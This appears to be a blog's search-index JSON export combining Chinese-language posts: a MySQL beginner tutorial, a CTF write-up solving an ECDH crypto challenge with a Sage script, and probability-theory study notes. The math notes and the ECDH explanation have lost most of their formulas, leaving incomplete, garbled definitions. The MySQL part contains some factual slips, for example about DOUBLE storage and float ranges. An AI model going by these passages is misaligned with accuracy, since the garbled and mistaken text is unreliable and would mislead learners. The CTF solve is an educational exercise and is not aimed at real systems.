c可以终止当前输入，mysql中不区分大小写，如果出现以下情况，说明语句未结束，可能是漏了分号\nmysql&gt; show database    -&gt; \n#Expected output:mysql&gt; show databases;#+--------------------+#| Database           |#+--------------------+#| information_schema |#| mysql              |#| sys                |#+--------------------+#4 rows in set (0.01 sec)\n\n2.2 建立数据库create database test1;\n#Expected output:#Query OK, 1 row affected (0.01 sec)mysql&gt; show databases;#+--------------------+#| Database           |#+--------------------+#| information_schema |#| mysql              |#| performance_schema |#| sys                |#| test1              |#+--------------------+#5 rows in set (0.00 sec)\n\n2.3 数据库语句分类2.3.1 DQL（数据查询语言）数据查询语言（Data Query Language, DQL）是SQL语言中，负责进行数据查询而不会对数据本身进行修改的语句，这是最基本的SQL语句。\n#我们在看到select…这样的sql语句，都是数据查询语句，凡是带有select关键字的SQL语句都是DQL语句\n2.3.2 DML（数据操纵语言）  数据操纵语言（Data Manipulation Language, DML）是SQL语言中，负责对数据库对象运行数据访问工作的指令集，以INSERT、UPDATE、DELETE三种指令为核心，分别代表插入、更新与删除。\n#凡是带有INSERT、UPDATE、DELETE关键字的语句都是DML#insert —— 插入，等同于增#update —— 更新，等同修改#delete —— 删除\n​    这个主要操作的是表中的数据\n2.3.3 DDL（数据定义语言）  数据定义语言 (Data Definition Language, DDL) 是SQL语言集中，负责数据结构定义与数据库对象定义的语言，由creat、alter 与 drop 三个语法所组成. DDL 主要操作的是 表的结构 不是表中的数据\n#凡是带有 create（增）、alter（改）、drop（删）关键字的语句都是DDL#create —— 新建、等同于增#drop —— 删除#alter —— 修改\n​    这个增删改与 DML 有所不同，这个主要是对表结构进行操作.\n2.3.4 DCL（数据控制语言）  数据控制语言 (Data Control Language) 在SQL语言中，是一种可对数据访问权进行控制的指令，它可以控制特定用户账户对数据表、查看表、预存程序、用户自定义函数等数据库对象的控制权。对数据的权限进行控制的语言.\n#请求授权—— grant#撤销授权 —— revoke\n2.3.5 TCL（事务处理语言）  这里的TCL可不是王牌电视，事务处理语言(Transaction Control Language),它的语句能确保被DML语句影响的表的所有行及时得以更新。是一种事务控制语言。\n#事务提交 —— commit#事务回滚 —— rollback\n\n2.4 数据库的分类2.4.1 关系型数据库Mysql、Sql server、Oracle 、SqLite属于关系型数据库\n把数据按照 表 的形式来进行组织（类似于Excel这种形式的），关系型数据库能够对数据进行更严格的校验，带来更好的数据的完整性\n2.4.2 非关系型数据库Redis、HBase 、MongoDB属于非关系型数据库\n把数据按照 文档 的形式来进行组织，文档和文档之间的差别可以较大，更灵活的组织数据，效率更高，更容易在分布式环境下使用\n\n2.5 什么是表表是组织数据的一种形式，类似于Excel中的表格\n数据库中是以 表格的形式来表示数据的，因为表格比较直观，任何表都有行和列\n行（row）: 被称为数据/ 记录\n列（column）: 被称为字段\n每个字段都有字段名、数据类型、约束条件等属性\n字段名：只是一个普通的名字，见名知意就行了\n数据类型： 字符串类型，数字、日期等类型，在后面我们会详细介绍\n约束：约束也有很多，其中有一个叫做唯一性约束，这种约束添加后，该字段的数据不能重复\n2.5.1 查看数据库中的表use test1;\n#Expected output:#Database changed\nshow tables;\n#Expected output:#+--------------------+#| Database in test1  |#+--------------------+#| article            |#| res                |#| name               |#+--------------------+#3 rows in set (0.00 sec)\n\n2.6 数据库操作2.6.1 显示当前的数据库show databases;\n#Expected output:#+--------------------+#| Database           |#+--------------------+#| information_schema |#| mysql              |#| sys                |#+--------------------+#4 rows in set (0.01 sec)\n2.6.2 创建数据库create database [name];\n#Expected output:#Query OK, 1 row affected (0.01 sec)mysql&gt; show databases;#+--------------------+#| Database           |#+--------------------+#| information_schema |#| mysql              |#| performance_schema |#| sys                |#| name               |#+--------------------+#5 rows in set (0.00 sec)\n语法：\nCREATE DATABASE [IF NOT EXISTS] db_name [create_specification] [,create_specification] ...]create_specification:\t[DEFAULT] CHARACTER SET charset_name\t[DEFAULT] COLLATE collation_name#大写的表示是关键字#[]是可选项#CHARACTER SET：指定数据库采用的字符集#COLLATE：指定数据库字符集的校验规则\n2.6.3 选中/使用数据库use [name];\n#Expected output:#Database changed\n2.6.4 删除数据库drop database [name];\n语法：\nDROP DATABASE [IF EXISTS] db_name\n#Expected output:#Query OK, 0 row affected (0.00 sec)\n 一旦删除数据库，这里的数据通过常规的手段就找不回来了！！！所以删除数据库是一个非常危险的操作！！在工作中，无论如何都不要使用drop database操作，尤其是针对线上环境~\n2.7 数据类型数据类型（data_type）是指系统中所允许的数据的类型。数据库中的每个列都应该有适当的数据类型，用于限制或允许该列中存储的数据。例如，列中存储的为数字，则相应的数据类型应该为数值类型。\n如果使用错误的数据类型可能会严重影响应用程序的功能和性能，所以在设计表时，应该特别重视数据列所用的数据类型。更改包含数据的列不是一件小事，这样做可能会导致数据丢失。因此，在创建表时必须为每个列设置正确的数据类型和长度。\nMySQL 的数据类型有大概可以分为整数类型、浮点数类型和定点数类型、日期和时间类型、字符串类型、二进制类型等。\n注意： 整数类型和浮点数类型可以统称为数值数据类型。\n\n数值类型：整数类型包括 TINYINT、SMALLINT、MEDIUMINT、INT、BIGINT，浮点数类型包括 FLOAT 和 DOUBLE，定点数类型为 DECIMAL。\n日期/时间类型：包括 YEAR、TIME、DATE、DATETIME 和 TIMESTAMP。\n字符串类型：包括 CHAR、VARCHAR、BINARY、VARBINARY、BLOB、TEXT、ENUM 和 SET 等。\n二进制类型：包括 BIT、BINARY、VARBINARY、TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB。\n\n\n2.7.1 数值类型整数类型MySQL 主要提供的整数类型有 TINYINT、SMALLINT、MEDIUMINT、INT、BIGINT，其属性字段可以添加 AUTO_INCREMENT 自增约束条件。\n\n从上表中可以看到，不同类型的整数存储所需的字节数不相同，占用字节数最小的是 TINYINT 类型，占用字节最大的是 BIGINT 类型，占用的字节越多的类型所能表示的数值范围越大。\n根据占用字节数可以求出每一种数据类型的取值范围。例如，TINYINT 需要 1 个字节（8bit）来存储，那么 TINYINT 无符号数的最大值为 28-1，即 255；TINYINT 有符号数的最大值为 27-1，即 127。其他类型的整数的取值范围计算方法相同，如下表所示。\n\n提示： 显示宽度和数据类型的取值范围是无关的。显示宽度只是指明 MySQL 最大可能显示的数字个数，数值的位数小于指定的宽度时会由空格填充。如果插入了大于显示宽度的值，只要该值不超过该类型整数的取值范围，数值依然可以插入，而且能够显示出来。例如，year 字段插入 19999，当使用 SELECT 查询该列值的时候，MySQL 显示的将是完整的带有 5 位数字的 19999，而不是 4 位数字的值。\n其他整型数据类型也可以在定义表结构时指定所需的显示宽度，如果不指定，则系统为每一种类型指定默认的宽度值。\n不同的整数类型有不同的取值范围，并且需要不同的存储空间，因此应根据实际需要选择最合适的类型，这样有利于提高查询的效率和节省存储空间。\n浮点类型MySQL 中使用浮点数和定点数来表示小数。\n浮点类型有两种，分别是单精度浮点数（FLOAT）和双精度浮点数（DOUBLE）；定点类型只有一种，就是 DECIMAL。\n浮点类型和定点类型都可以用(M, D)来表示，其中 M 称为精度，表示总共的位数；D 称为标度，表示小数的位数。\n浮点数类型的取值范围为 M（1～255）和 D（1～30，且不能大于 M-2），分别表示显示宽度和小数位数。M 和 D 在 FLOAT 和DOUBLE 中是可选的，FLOAT 和 DOUBLE 类型将被保存为硬件所支持的最大精度。DECIMAL 的默认 D 值为 0、M 值为 10。\n下表中列出了 MySQL 中的小数类型和存储需求。\n\nDECIMAL 类型不同于 FLOAT 和 DOUBLE。DOUBLE 实际上是以字符串的形式存放的，DECIMAL 可能的最大取值范围与 DOUBLE 相同，但是有效的取值范围由 M 和 D 决定。如果改变 M 而固定 D，则取值范围将随 M 的变大而变大。\n从上表中可以看到，DECIMAL 的存储空间并不是固定的，而由精度值 M 决定，占用 M+2 个字节。\nFLOAT 类型的取值范围如下：\n\n有符号的取值范围：-3.402823466E+38～-1.175494351E-38。\n无符号的取值范围：0 和 -1.175494351E-38～-3.402823466E+38。\n\nDOUBLE 类型的取值范围如下：\n\n有符号的取值范围：-1.7976931348623157E+308～-2.2250738585072014E-308。\n无符号的取值范围：0 和 -2.2250738585072014E-308～-1.7976931348623157E+308。\n\n提示：\n\n不论是定点还是浮点类型，如果用户指定的精度超出精度范围，则会四舍五入进行处理。\nFLOAT 和 DOUBLE 在不指定精度时，默认会按照实际的精度（由计算机硬件和操作系统决定），DECIMAL 如果不指定精度，默认为（10，0）。\n浮点数相对于定点数的优点是在长度一定的情况下，浮点数能够表示更大的范围；缺点是会引起精度问题。\n在 MySQL 中，定点数以字符串形式存储，在对精度要求比较高的时候（如货币、科学数据），使用 DECIMAL 的类型比较好\n另外两个浮点数进行减法和比较运算时也容易出问题，所以在使用浮点数时需要注意，并尽量避免做浮点数比较。\n\n\n2.7.2 日期和时间类型MySQL 中有多处表示日期的数据类型：YEAR、TIME、DATE、DTAETIME、TIMESTAMP。当只记录年信息的时候，可以只使用 YEAR 类型。\n每一个类型都有合法的取值范围，当指定确定不合法的值时，系统将“零”值插入数据库中。\n\nYEAR 类型YEAR 类型是一个单字节类型，用于表示年，在存储时只需要 1 个字节。可以使用各种格式指定 YEAR，如下所示：\n\n以 4 位字符串或者 4 位数字格式表示的 YEAR，范围为 ‘1901’～’2155’。输入格式为 ‘YYYY’ 或者 YYYY，例如，输入 ‘2010’ 或 2010，插入数据库的值均为 2010。\n以 2 位字符串格式表示的 YEAR，范围为 ‘00’ 到 ‘99’。’00’～’69’ 和 ‘70’～’99’ 范围的值分别被转换为 2000～2069 和 1970～1999 范围的 YEAR 值。’0’ 与 ‘00’ 的作用相同。插入超过取值范围的值将被转换为 2000。\n以 2 位数字表示的 YEAR，范围为 1～99。1～99 和 70～99 范围的值分别被转换为 2001～2069 和 1970～1999 范围的 YEAR 值。注意，在这里 0 值将被转换为 0000，而不是 2000。\n\n提示： 两位整数范围与两位字符串范围稍有不同。例如，插入 3000 年，读者可能会使用数字格式的 0 表示 YEAR，实际上，插入数据库的值为 0000，而不是所希望的 3000。只有使用字符串格式的 ‘0’ 或 ‘00’，才可以被正确解释为 3000，非法 YEAR值将被转换为 0000。\nTIME 类型TIME 类型用于只需要时间信息的值，在存储时需要 3 个字节。格式为 HH:MM:SS。HH 表示小时，MM 表示分钟，SS 表示秒。\nTIME 类型的取值范围为 -838：59：59～838：59：59，小时部分如此大的原因是 TIME 类型不仅可以用于表示一天的时间（必须小于 24 小时），还可能是某个事件过去的时间或两个事件之间的时间间隔（可大于 24 小时，或者甚至为负）。\n可以使用各种格式指定 TIME 值，如下所示。\n\n‘D HH：MM：SS‘ 格式的字符串。还可以使用这些“非严格”的语法：’HH：MM：SS‘、’HH：MM‘、’D HH‘ 或 ‘SS‘。这里的 D 表示日，可以取 0～34 之间的值。在插入数据库时，D 被转换为小时保存，格式为 “D*24+HH”。\n‘HHMMSS‘ 格式、没有间隔符的字符串或者 HHMMSS 格式的数值，假定是有意义的时间。例如，’101112’ 被理解为’10：11：12’，但是 ‘106112’ 是不合法的（它有一个没有意义的分钟部分），在存储时将变为 00：00：00。\n\n为 TIME 列分配简写值时应注意：\n\n如果没有冒号，MySQL 解释值时，假定最右边的两位表示秒。（MySQL 解释 TIME 值为过去的时间而不是当前的时间）。例如，读者可能认为 ‘1112’ 和 1112 表示 11：12：00（即 11 点过 12 分钟），但MySQL 将它们解释为 00：11：12（即 11 分 12 秒）。同样 ‘12’ 和 12 被解释为00：00：12。\n相反，TIME 值中如果使用冒号则肯定被看作当天的时间，也就是说，’11：12’ 表示 11：12：00，而不是 00：11：12。\n\nDATE 类型DATE 类型用于仅需要日期值时，没有时间部分，在存储时需要 3 个字节。日期格式为 ‘YYYY-MM-DD‘，其中 YYYY 表示年，MM 表示月，DD 表示日。\n在给 DATE 类型的字段赋值时，可以使用字符串类型或者数字类型的数据插入，只要符合 DATE 的日期格式即可。如下所示：\n\n以 ‘YYYY-MM-DD‘ 或者 ‘YYYYMMDD‘ 字符中格式表示的日期，取值范围为 ‘1000-01-01’～’9999-12-3’。例如，输入 ‘2015-12-31’ 或者 ‘20151231’，插入数据库的日期为2015-12-31。\n以 ‘YY-MM-DD‘ 或者 ‘YYMMDD‘ 字符串格式表示日期，在这里YY表示两位的年值。MySQL 解释两位年值的规则：’00～69’ 范围的年值转换为 ‘2000-2069’，’70-99’ 范围的年值转换为 ‘1970～1999’。例如，输入 ‘15-12-31’，插入数据库的日期为 2015-12-31；输入 ‘991231’，插入数据库的日期为 1999-12-31。\n以YYMMDD 数字格式表示的日期，与前面相似，00~69 范围的年值转换为 2000～2069，80～99 范围的年值转换为 1980～1999。例如，输入 151231，插入数据库的日期为 2015-12-31，输入 991231，插入数据库的日期为 1999-12-31。\n使用 CURRENT_DATE 或者 NOW()，插入当前系统日期。\n\nMySQL 允许“不严格”语法： 任何标点符号都可以用作日期部分之间的间隔符。例如，’98-11-31’、’98.11.31’、’98/11/31’和’98@11@31’ 是等价的，这些值也可以正确地插入数据库。\nDATETIME 类型DATETIME 类型用于需要同时包含日期和时间信息的值，在存储时需要 8 个字节。日期格式为 ‘YYYY-MM-DD HH：MM：SS‘，其中 YYYY 表示年，MM 表示月，DD 表示日，HH 表示小时，MM 表示分钟，SS 表示秒。\n在给 DATETIME 类型的字段赋值时，可以使用字符串类型或者数字类型的数据插入，只要符合 DATETIME 的日期格式即可，如下所示。\n\n以 ‘YYYY-MM-DD HH：MM：SS‘ 或者 ‘YYYYMMDDHHMMSS‘ 字符串格式表示的日期，取值范围为 ‘1000-01-01 00：00：00’～’9999-12-3 23：59：59’。例如，输入 ‘2014-12-31 05：05：05’ 或者 ‘20141231050505’，插入数据库的 DATETIME 值都为 2014-12-31 05：05：05。\n以 ‘YY-MM-DD HH：MM：SS‘ 或者 ‘YYMMDDHHMMSS‘ 字符串格式表示的日期，在这里 YY 表示两位的年值。与前面相同，’00～79’ 范围的年值转换为 ‘2000～2079’，’80～99’ 范围的年值转换为 ‘1980～1999’。例如，输入 ‘14-12-31 05：05：05’，插入数据库的 DATETIME 为 2014-12-31 05：05：05；输入 141231050505，插入数据库的 DATETIME 为 2014-12-31 05：05：05。\n以 YYYYMMDDHHMMSS 或者 YYMMDDHHMMSS 数字格式表示的日期和时间。例如，输入 20141231050505，插入数据库的 DATETIME 为 2014-12-31 05：05：05；输入 140505050505，插入数据库的 DATETIME 为 2014-12-31 05：05：05。\n\nMySQL 允许“不严格”语法： 任何标点符号都可用作日期部分或时间部分之间的间隔符。例如，’98-12-31 11：30：45’、’98.12.31 11+30+35’、’98/12/31 113045’ 和 ‘98@12@31 11^30^45’ 是等价的，这些值都可以正确地插入数据库。\nTIMESTAMP 类型TIMESTAMP 的显示格式与 DATETIME 相同，显示宽度固定在 19 个字符，日期格式为 YYYY-MM-DD HH：MM：SS，在存储时需要 4 个字节。但是 TIMESTAMP 列的取值范围小于 DATETIME 的取值范围，为 ‘1970-01-01 00：00：01’UTC～’2038-01-19 03：14：07’UTC。在插入数据时，要保证在合法的取值范围内。\n提示： 协调世界时（英：Coordinated Universal Time，法：Temps Universel Coordonné）又称为世界统一时间、世界标准时间、国际协调时间。英文（CUT）和法文（TUC）的缩写不同，作为妥协，简称 UTC。\nTIMESTAMP 与 DATETIME 除了存储字节和支持的范围不同外，还有一个最大的区别是：\n\nDATETIME 在存储日期数据时，按实际输入的格式存储，即输入什么就存储什么，与时区无关；\n而 TIMESTAMP 值的存储是以 UTC（世界标准时间）格式保存的，存储时对当前时区进行转换，检索时再转换回当前时区。即查询时，根据当前时区的不同，显示的时间值是不同的。\n\n提示： 如果为一个 DATETIME 或 TIMESTAMP 对象分配一个 DATE 值，结果值的时间部分被设置为 ‘00：00：00’，因此 DATE 值未包含时间信息。如果为一个 DATE 对象分配一个 DATETIME 或 TIMESTAMP 值，结果值的时间部分被删除，因此DATE 值未包含时间信息。\n\n2.7.3 字符串类型字符串类型用来存储字符串数据，还可以存储图片和声音的二进制数据。字符串可以区分或者不区分大小写的串比较，还可以进行正则表达式的匹配查找。\nMySQL 中的字符串类型有 CHAR、VARCHAR、TINYTEXT、TEXT、MEDIUMTEXT、LONGTEXT、ENUM、SET 等。\n下表中列出了 MySQL 中的字符串数据类型，括号中的 M 表示可以为其指定长度。\n\nVARCHAR 和 TEXT 类型是变长类型，其存储需求取决于列值的实际长度（在前面的表格中用 L 表示），而不是取决于类型的最大可能尺寸。\n例如，一个 VARCHAR(10) 列能保存一个最大长度为 10 个字符的字符串，实际的存储需要字符串的长度 L 加上一个字节以记录字符串的长度。对于字符 “abcd”，L 是 4，而存储要求 5 个字节。\nCHAR 和 VARCHAR 类型CHAR(M) 为固定长度字符串，在定义时指定字符串列长。当保存时，在右侧填充空格以达到指定的长度。M 表示列的长度，范围是 0～255 个字符。\n例如，CHAR(4) 定义了一个固定长度的字符串列，包含的字符个数最大为 4。当检索到 CHAR 值时，尾部的空格将被删除。\nVARCHAR(M) 是长度可变的字符串，M 表示最大列的长度，M 的范围是 0～65535。VARCHAR 的最大实际长度由最长的行的大小和使用的字符集确定，而实际占用的空间为字符串的实际长度加 1。\n例如，VARCHAR(50) 定义了一个最大长度为 50 的字符串，如果插入的字符串只有 10 个字符，则实际存储的字符串为 10 个字符和一个字符串结束字符。VARCHAR 在值保存和检索时尾部的空格仍保留。\n实例： 下面将不同的字符串保存到 CHAR(4) 和 VARCHAR(4) 列，说明 CHAR 和 VARCHAR 之间的差别，如下表所示。\n\n对比结果可以看到，CHAR(4) 定义了固定长度为 4 的列，无论存入的数据长度为多少，所占用的空间均为 4 个字节。VARCHAR(4) 定义的列所占的字节数为实际长度加 1。\nTEXT 类型TEXT 列保存非二进制字符串，如文章内容、评论等。当保存或查询 TEXT 列的值时，不删除尾部空格。\nTEXT 类型分为 4 种：TINYTEXT、TEXT、MEDIUMTEXT 和 LONGTEXT。不同的 TEXT 类型的存储空间和数据长度不同。\n\nTINYTEXT 表示长度为 255字符的 TEXT 列。\nTEXT 表示长度为 65535字符的 TEXT 列。\nMEDIUMTEXT 表示长度为 16777215字符的 TEXT 列。\nLONGTEXT 表示长度为 4294967295 或 4GB 字符的 TEXT 列。\n\nENUM 类型ENUM 是一个字符串对象，值为表创建时列规定中枚举的一列值。其语法格式如下：\n&lt;字段名&gt; ENUM( &#x27;值1&#x27;, &#x27;值1&#x27;, …, &#x27;值n&#x27; )\n字段名指将要定义的字段，值 n 指枚举列表中第 n 个值。\nENUM 类型的字段在取值时，能在指定的枚举列表中获取，而且一次只能取一个。如果创建的成员中有空格，尾部的空格将自动被删除。\nENUM 值在内部用整数表示，每个枚举值均有一个索引值；列表值所允许的成员值从 1 开始编号，MySQL 存储的就是这个索引编号，枚举最多可以有 65535 个元素。\n例如，定义 ENUM 类型的列（’first’，’second’，’third’），该列可以取的值和每个值的索引如下表所示。\n\nENUM 值依照列索引顺序排列，并且空字符串排在非空字符串前，NULL 值排在其他所有枚举值前。\n提示： ENUM 列总有一个默认值。如果将 ENUM 列声明为 NULL，NULL 值则为该列的一个有效值，并且默认值为 NULL。如果 ENUM 列被声明为 NOT NULL，其默认值为允许的值列表的第 1 个元素。\nSET 类型SET 是一个字符串的对象，可以有零或多个值，SET 列最多可以有 64 个成员，值为表创建时规定的一列值。指定包括多个 SET 成员的 SET 列值时，各成员之间用逗号,隔开，语法格式如下：\nSET( &#x27;值1&#x27;, &#x27;值2&#x27;, …, &#x27;值n&#x27; )\n与 ENUM 类型相同，SET 值在内部用整数表示，列表中每个值都有一个索引编号。当创建表时，SET 成员值的尾部空格将自动删除。\n但与 ENUM 类型不同的是，ENUM 类型的字段只能从定义的列值中选择一个值插入，而 SET 类型的列可从定义的列值中选择多个字符的联合。\n提示： 如果插入 SET 字段中的列值有重复，则 MySQL 自动删除重复的值；插入 SET 字段的值的顺序并不重要，MySQL 会在存入数据库时，按照定义的顺序显示；如果插入了不正确的值，默认情况下，MySQL 将忽视这些值，给出警告。\n\n2.7.4 二进制类型MySQL 支持两类字符型数据：文本字符串和二进制字符串。二进制字符串类型有时候也直接被称为“二进制类型”。\nMySQL 中的二进制字符串有 BIT、BINARY、VARBINARY、TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB。\n下表中列出了 MySQL 中的二进制数据类型，括号中的 M 表示可以为其指定长度。\n\nBIT 类型位字段类型。M 表示每个值的位数，范围为 1～64。如果 M 被省略，默认值为 1。如果为 BIT(M) 列分配的值的长度小于 M 位，在值的左边用 0 填充。例如，为 BIT(6) 列分配一个值 b’101’，其效果与分配 b’000101’ 相同。\nBIT 数据类型用来保存位字段值，例如以二进制的形式保存数据 13，13 的二进制形式为 1101，在这里需要位数至少为 4 位的 BIT 类型，即可以定义列类型为 BIT(4)。大于二进制 1111 的数据是不能插入BIT(4) 类型的字段中的。\n提示： 默认情况下，MySQL 不可以插入超出该列允许范围的值，因而插入数据时要确保插入的值在指定的范围内。\nBINARY 和 VARBINARY 类型BINARY 和 VARBINARY 类型类似于 CHAR 和 VARCHAR，不同的是它们包含二进制字节字符串。使用的语法格式如下：\n列名称 BINARY(M) 或者 VARBINARY(M)\nBINARY 类型的长度是固定的，指定长度后，不足最大长度的，将在它们右边填充 “\\0” 补齐，以达到指定长度。例如，指定列数据类型为 BINARY(3)，当插入 a 时，存储的内容实际为 “\\a0\\0”，当插入 ab 时，实际存储的内容为“ab\\0”，无论存储的内容是否达到指定的长度，存储空间均为指定的值 M。\nVARBINARY 类型的长度是可变的，指定好长度之后，长度可以在 0 到最大值之间。例如，指定列数据类型为 VARBINARY(20)，如果插入的值长度只有 10，则实际存储空间为 10 加 1，实际占用的空间为字符串的实际长度加 1。\nBLOB 类型BLOB 是一个二进制的对象，用来存储可变数量的数据。BLOB 类型分为 4 种：TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB，它们可容纳值的最大长度不同，如下表所示。\n\n\nBLOB 列存储的是二进制字符串（字节字符串），TEXT 列存储的是非进制字符串（字符字符串）。\nBLOB 列是字符集，并且排序和比较基于列值字节的数值；TEXT 列有一个字符集，并且根据字符集对值进行排序和比较。\n\n\n2.7.5 Linkhttps://mp.weixin.qq.com/s?__biz=MzA5NzQxOTE4NA==&amp;mid=2247484005&amp;idx=1&amp;sn=9cfc06b6605cfc10056971a745e400e2&amp;chksm=90a068baa7d7e1ac5f14f0b42d54ebb8effc1b1e9bb6035f22ea1eb6d2ad2dcfd35fc6323e0b&amp;scene=27\n2.8 表的操作需要操作数据库中的表时，需要先使用该数据库\nuse db_test;\n2.8.1 查看表结构desc [name]\n表结构的具体解释：\n\n2.8.2 创建表create table table_name(datatype1,datatype2,...);\n2.8.3 删除表drop table table_name;\n语法：\nDROP [TEMPORARY] TABLE [IF EXISTS] tbl_name [, tbl_name] ...\n","categories":["MySQL"],"tags":["MySQL"]},{"title":"ECDH-密码交换攻击","url":"/2023/03/11/ECDH/","content":"[NewStarCTF] Week 5 - An der schönen Elliptische KurveAnalyz先上题：\n#task.sagefrom secret import FLAG, ECDH_KEY_EXCHANGEfrom Crypto.Cipher import AESfrom hashlib import md5from os import urandomiv = urandom(16)a = 14489b = 10289p = 7486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661F = GF(p)E = EllipticCurve(F, [a, b])G = E.random_point()my_private_key = random_prime(2^256)shared, sender_public_key = ECDH_KEY_EXCHANGE(G, my_private_key)key = md5(str(int(shared.xy()[0])).encode()).digest()cipher = AES.new(key, AES.MODE_CBC, iv)ciphretext = cipher.encrypt(FLAG)print(a)print(b)print(p)print(sender_public_key)print(my_private_key)print(ciphretext.hex())print(iv.hex())\n#output.txt14489102897486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661(1285788649714386836892440333012889444698233333809489364474616947934542770724999997145538088456652601147045234490019282952264340541239682982255115303711207 : 1081635450946385063319483423983665253792071829707039194609541132041775615770167048603029155228167113450196436786905820356216200242445665942628721193713459 : 1)25495456812197660236899774619860149159465038062538775349151750933063178527732f65ff4a97e0e05c06eab06b58ea38a3d5b6d2a65ea4907bc46493b30081a211d7cffc872a23dbd565ef307f9492bb23d151c04c645c3e2a8d3f1ae44589ef20\n浅分析一下task.sage，我们只有sender_public_key和my_private_key，显然考察的是ECDH\n\nECDH算法假设有两端，Alice和Bob，他们想在非安全信道上安全地交换信息但又不想被第三方获取，此时可以采用ECDH密钥交换算法\n双方都知道ECDH算法中的一个大素数p，还有一个整数g作为辅助\nAlice生成私钥a，并通过生成公钥。Bob生成私钥b，然后通过生成公钥B，在发送B之前，Bob通过生成公共密钥，但是只发送B，而Alice在接收到Bob的公钥B之后，同样可以通过来生成公共密钥K。\n\n攻击对于Alice和Bob来说，\n所以我们可以得出以下结论，\nEXP#Sagefrom hashlib import *from Crypto.Cipher import AESfrom Crypto.Util.number import *a=14489b=10289p=7486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661#sender_public_key=(1285788649714386836892440333012889444698233333809489364474616947934542770724999997145538088456652601147045234490019282952264340541239682982255115303711207 : 1081635450946385063319483423983665253792071829707039194609541132041775615770167048603029155228167113450196436786905820356216200242445665942628721193713459 : 1)my_private_key=2549545681219766023689977461986014915946503806253877534915175093306317852773ciphertext=\"2f65ff4a97e0e05c06eab06b58ea38a3d5b6d2a65ea4907bc46493b30081a211d7cffc872a23dbd565ef307f9492bb23\"iv=\"d151c04c645c3e2a8d3f1ae44589ef20\"F=GF(p)E=EllipticCurve(F,[a,b])sender_public_key=E([1285788649714386836892440333012889444698233333809489364474616947934542770724999997145538088456652601147045234490019282952264340541239682982255115303711207,1081635450946385063319483423983665253792071829707039194609541132041775615770167048603029155228167113450196436786905820356216200242445665942628721193713459])shared=sender_public_key*my_private_keykey = md5(str(int(shared.xy()[0])).encode()).digest()#iv=int(iv,16)iv=bytes.fromhex(iv)#ciphertext=int(ciphertext,16)ciphertext=bytes.fromhex(ciphertext)cipher=AES.new(key,AES.MODE_CBC,iv)cipher=cipher.decrypt(ciphertext)print(cipher)\n","categories":["CTF"],"tags":["CTF","CRYPTO","ECC","ECDH"]},{"title":"概率论与数理统计知识梳理（三）","url":"/2023/04/05/Probability-theory-and-mathematical-statistics_Chapter_3/","content":"概率论与数理统计第三章 二维随机变量及其分布3.1 二维随机变量的联合分布与边际分布\n二维随机变量的定义：设和为两个随机变量，则称有序数组为二维随机变量\n联合分布函数的定义：设二维随机变量，对任意实数，二元函数称为的联合分布函数\n分布函数的性质\n对或都是非严格单调递增函数\n对任意的，\n分别对右连续，即\n矩形法则：对任何，都有\n\n\n边际分布函数的定义：\n\n3.2 二维离散型随机变量\n联合分布列的定义：设为二维离散型随机变量，且的可能取值记为，的可能取值记为，则称为二维离散型随机变量的联合分布列\n联合分布列的性质\n非负性：\n归一性：\n\n\n联合分布函数的定义：已知的联合分布列为，则称为的联合分布函数\n边际分布列的定义：设为二维离散型随机变量，其联合分布列为，则称为的边际分布列，称为的边际分布列\n边际分布列的性质：，同理，\n二维离散型随机变量的独立性：设为二维离散型随机变量，的可能取值分别为与，如果对任意的，都有，则称与是相互独立的\n条件分布列的定义：设为二维离散型随机变量，的可能取值分别为与，对任意的，称为已知条件下的条件分布列，称为已知条件下的条件分布列\n\n3.3 二维连续型随机变量\n联合密度的定义：设为二维随机变量的联合分布函数，若存在非负函数，使得对于任意的，有，则称为二维连续型随机变量，并称为的联合概率密度函数\n\n联合密度的性质：\n\n非负性：\n归一性：\n是二元连续函数\n在的连续点处有\n二维连续型随机变量在一点和一条线上的概率均为0\n\n\n边际密度的定义：设为而为连续型随机变量，联合密度函数为，称为的边际密度函数，为的边际密度函数\n\n二维均匀分布\n\n\\begin{align}\nf(x,y)=\n\\begin{cases}\n\\frac{1}{S_{D}}&(x,y)\\in D\\\\\n0&(x,y)\\notin D\\\\\n\\end{cases}\n\\end{align}\n二维正态分布：\n\n二维连续型随机变量的独立性：设及分别是二维连续型随机变量的分布函数和边缘分布函数，若对于所有的，有或，则称随机变量和是相互独立的\n\n二维正态分布独立性：设，则和相互独立的充要条件是\n\n条件分布的定义：设是二维连续型随机变量，对，称为给定条件下的条件分布函数，为给定条件下的条件密度函数\n\n\n3.4 二维随机变量函数的分布\n泊松分布的可加性：已知与相互独立，且分别服从参数为和的泊松分布，则服从参数为的泊松分布\n对于，求密度函数，先求的分布函数，然后对求导，就能得到的密度函数。一般地，的分布函数为\n极大极小分布：设随机变量相互独立，且的分布函数为，，令，那么有（1）的分布函数为（2）的分布函数为，特别地，如果具有相同的分布函数，则\n\n","categories":["Vulnerability_recurrence"],"tags":["Study","Mathematical statistics","Probability theory"]},{"title":"概率论与数理统计知识梳理（四）","url":"/2023/04/07/Probability-theory-and-mathematical-statistics_Chapter_4/","content":"概率论与数理统计第六章 数理统计的基本概念6.1 总体、样本、统计量\n\n\n","categories":["Vulnerability_recurrence"],"tags":["Study","Mathematical statistics","Probability theory"]},{"title":"概率论与数理统计知识梳理（五）","url":"/2023/04/13/Probability-theory-and-mathematical-statistics_Chapter_6/","content":"概率论与数理统计第六章 数理统计的基本概念6.1 总体、样本、统计量\n简单随机抽样的性质\n\n代表性：总体中每个个体都有同等机会被抽入样本，即可以认为样本中的每个都与总体有相同的分布\n独立性：样本中每个个体的取值并不影响其他个体的取值，这以为着相互独立\n\n\n常见的统计量，设是从总体中抽取的样本\n\n样本均值：\n样本方差：\n\n样本标准差：\n样本阶原点矩：\n样本中心矩：\n极大次序统计量：\n极小次序统计量：\n一般来说\n用样本均值的观测值来近似估计总体均值\n用样本方差的观测值；来近似估计总体方差\n用样本阶原点矩的观测值来近似估计总体阶矩\n\n\n\n\n\n6.2 